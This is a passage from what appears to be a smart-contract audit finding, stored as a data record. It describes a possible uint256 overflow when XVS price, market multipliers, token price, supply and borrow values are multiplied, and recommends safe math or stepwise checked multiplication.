file.\n3.

If the `xvsPrice`, `xvs`, `markets[market].borrowMultiplier`, `markets[market].supplyMultiplier`, `tokenPrice`, `supply`, or `borrow` variables have large values, the product of these multiplications can exceed the maximum capacity of the variable type designed to store the result (uint256 in this case). This scenario will result in an overflow, causing the smart contract to revert the transaction or produce incorrect calculations.\n\nTo prevent this vulnerability, the developer should utilize safe math operations that revert the transaction if an overflow would occur, reduce the precision factors used in computations, or perform the multiplication in steps, checking for possible overflows at each stage.",
